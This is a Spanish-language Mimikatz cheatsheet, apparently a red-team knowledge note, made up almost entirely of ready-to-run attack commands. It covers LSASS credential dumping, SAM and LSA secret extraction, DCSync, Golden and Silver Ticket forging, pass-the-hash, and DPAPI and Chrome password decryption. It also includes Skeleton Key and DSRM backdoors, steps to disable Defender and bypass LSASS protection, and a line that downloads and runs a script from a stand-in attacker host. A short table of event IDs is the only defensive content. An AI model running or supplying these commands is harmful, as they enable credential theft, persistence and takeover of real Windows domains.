---
aliases:
  - Mimikatz
  - Mimikatz Commands
tags:
  - type/atomic
  - technique/credential-access
  - technique/persistence
  - env/windows
  - asset/active-directory
  - tool/mimikatz
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Post-Exploitation]]"
tertiary categories:
  - "[[Active Directory]]"
type: Atomic
linked:
  - "[[LSASS Dumping]]"
  - "[[Active Directory Exploitation]]"
  - "[[DCSync]]"
  - "[[Golden Ticket]]"
  - "[[Silver Ticket]]"
  - "[[Pass-the-Hash]]"
  - "[[Pass-the-Ticket]]"
---
# Mimikatz Cheatsheet

***

## Cheatsheet
^mimikatz-cheatsheet

| Módulo | Comando | Qué hace |
| --- | --- | --- |
| **privilege** | `privilege::debug` | Habilitar SeDebugPrivilege (requerido casi siempre) |
| **sekurlsa** | `sekurlsa::logonpasswords` | Dump de LSASS — passwords plain/NTLM/Kerberos |
| **sekurlsa** | `sekurlsa::tickets /export` | Export Kerberos tickets de todas las sesiones |
| **sekurlsa** | `sekurlsa::pth` | Pass-the-Hash inyectado |
| **lsadump** | `lsadump::sam` | Dump SAM local |
| **lsadump** | `lsadump::dcsync /user:krbtgt` | DCSync remoto |
| **lsadump** | `lsadump::secrets` | LSA secrets (service accounts, etc.) |
| **kerberos** | `kerberos::golden /...` | Forge Golden/Silver Ticket |
| **kerberos** | `kerberos::ptt ticket.kirbi` | Pass-the-Ticket |
| **kerberos** | `kerberos::list /export` | Listar + exportar tickets de sesión actual |
| **vault** | `vault::cred /patch` | Dump Credential Manager |
| **crypto** | `crypto::certificates /export` | Export certs del store |
| **misc** | `misc::skeleton` | Skeleton Key (patch LSASS del DC) |
| **token** | `token::elevate` | Elevate a SYSTEM via token impersonation |

***

## Setup

### Obtener binario
- Oficial: https://github.com/gentilkiwi/mimikatz/releases
- Invoke-Mimikatz (PowerShell): `powersploit/Exfiltration/Invoke-Mimikatz.ps1`
- Built-in obfuscados con typical AMSI/Defender triggers.

### Evadir AV (local dev)
```powershell
# Agregar exclusión (requiere admin)
Set-MpPreference -ExclusionPath "C:\Temp\"

# Defender real-time off
Set-MpPreference -DisableRealtimeMonitoring $true
```

### Ejecución
```cmd
# Interactive
mimikatz.exe

# Scripted
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# PowerShell reflection
IEX(New-Object Net.WebClient).DownloadString('http://ATK/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -Command "privilege::debug; sekurlsa::logonpasswords"
```

## 1. Credenciales en memoria (sekurlsa)

Requiere admin local + `SeDebugPrivilege`.

```
privilege::debug
sekurlsa::logonpasswords

# Solo NT hash
sekurlsa::msv

# Kerberos tickets
sekurlsa::tickets
sekurlsa::tickets /export  # → .kirbi files

# Credentials wdigest (Windows <Server 2012R2 default)
sekurlsa::wdigest

# tspkg (legacy)
sekurlsa::tspkg

# Credman (masterkey)
sekurlsa::credman

# Live SSP (si implantado)
sekurlsa::logonpasswords /full
```

### Habilitar wdigest (fuerza plaintext en próximo logon)
```
lsadump::secrets
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
```

## 2. SAM / LSA secrets (lsadump)

```
# SAM local (local accounts)
lsadump::sam

# LSA secrets
lsadump::secrets

# Cached domain creds (DCC2 / MSCASHv2)
lsadump::cache

# Trust keys (entre dominios)
lsadump::trust /patch
```

### Desde hive files robados
```
lsadump::sam /sam:SAM /system:SYSTEM
lsadump::secrets /security:SECURITY /system:SYSTEM
lsadump::cache /security:SECURITY /system:SYSTEM
```

## 3. DCSync

```
lsadump::dcsync /domain:dom.local /user:krbtgt
lsadump::dcsync /domain:dom.local /user:Administrator
lsadump::dcsync /domain:dom.local /all /csv
```

Requiere permisos de replicación (DA o delegated).

## 4. Kerberos attacks

### Golden Ticket
```
kerberos::golden /user:fakeadmin /domain:dom.local /sid:S-1-5-21-... /krbtgt:KRBTGT_HASH /id:500 /groups:513,512,520,518,519 /ptt
```

### Silver Ticket
```
kerberos::golden /user:admin /domain:dom.local /sid:SID /target:host.dom.local /service:cifs /rc4:COMPUTER_HASH /id:500 /ptt
```

### Pass-the-Ticket
```
kerberos::ptt ticket.kirbi
kerberos::list /export
kerberos::purge
```

## 5. Pass-the-Hash

```
privilege::debug
sekurlsa::pth /user:Administrator /domain:dom.local /ntlm:NTHASH /run:cmd.exe

# AES
sekurlsa::pth /user:Administrator /domain:dom.local /aes256:AES_KEY /run:cmd.exe
```

Abre shell con creds inyectadas — `dir \\target\c$` etc.

## 6. Token manipulation

```
token::list
token::elevate              # SYSTEM via primary token steal
token::elevate /domainadmin # Token de DA si disponible
token::run /user:DOMAIN\admin /process:cmd.exe
token::revert
```

## 7. Credential Vault / DPAPI

```
# Credentials del Credential Manager
vault::cred /patch
vault::list

# DPAPI masterkeys (requiere SYSTEM o user owner)
dpapi::masterkey /in:"C:\Users\victim\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# Decrypt credencial con masterkey
dpapi::cred /in:"C:\Users\victim\AppData\Local\Microsoft\Credentials\FILE" /masterkey:MASTERKEY

# Chrome passwords
dpapi::chrome /in:"C:\Users\victim\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect
```

## 8. Certificates (crypto)

```
crypto::capi
crypto::cng
crypto::certificates /export
crypto::certificates /systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE /store:My /export
```

Certificates exportables del Current User / Local Machine stores → auth PKINIT + RDP + VPN.

## 9. Persistence

### Skeleton Key
Parche en LSASS del DC → master password `mimikatz` funciona para todo user del dominio.

```
privilege::debug
misc::skeleton
# Ahora: logon como cualquier user con password "mimikatz"
```

Vuelve a 0 al reboot del DC.

### DSRM backdoor
```
# En DC:
privilege::debug
token::elevate
lsadump::sam

# Change DSRM behavior
reg add HKLM\System\CurrentControlSet\Control\Lsa /v DsrmAdminLogonBehavior /t REG_DWORD /d 2 /f
```

DSRM account puede loguear por red.

## 10. Event ID / OpSec

| Acción | Events |
| --- | --- |
| `privilege::debug` | 4703, 4672 |
| `sekurlsa::logonpasswords` | 4673, 4674, handle sobre LSASS |
| `lsadump::dcsync` | 4662 (con GUID de replication rights) en DC |
| `kerberos::golden + ptt` | 4624 logon sin 4768 correlacionado |
| `misc::skeleton` | 4673 sobre lsass + anómalo Kerberos errors |

### Bypass PPL (Protected Process Light) de LSASS
```
!+                   # load driver mimidrv
!processprotect /process:lsass.exe /remove
privilege::debug
sekurlsa::logonpasswords
!processprotect /process:lsass.exe
!-                   # unload driver
```

Requiere driver `mimidrv.sys` firmado.

### Alternativa sin driver: process dump + parse offline
```cmd
# Con comsvcs.dll
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <LSASS_PID> C:\Temp\lsass.dmp full

# Procdump
procdump.exe -accepteula -ma lsass.exe lsass.dmp

# Parse offline con mimikatz
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```

## 11. Alternativas modernas

- **pypykatz** — Python, parse offline, no toca LSASS en target.
- **nanodump** (Cobalt Strike) — dump de LSASS sin triggear defender.
- **SafetyKatz** — Mimikatz minimizado + technique anti-AV.
- **Rubeus** — reemplazo para kerberos:: operations.
- **SharpSecDump** — standalone DCSync.
- **Dumpert** — LSASS dump via direct syscalls.

## Recursos

- [Mimikatz Wiki (oficial)](https://github.com/gentilkiwi/mimikatz/wiki)
- [ADSecurity - Mimikatz](https://adsecurity.org/?page_id=1821)
- [HackTricks - Mimikatz](https://book.hacktricks.xyz/windows-hardening/stealing-credentials/credentials-protections)
- [pypykatz](https://github.com/skelsec/pypykatz)

***
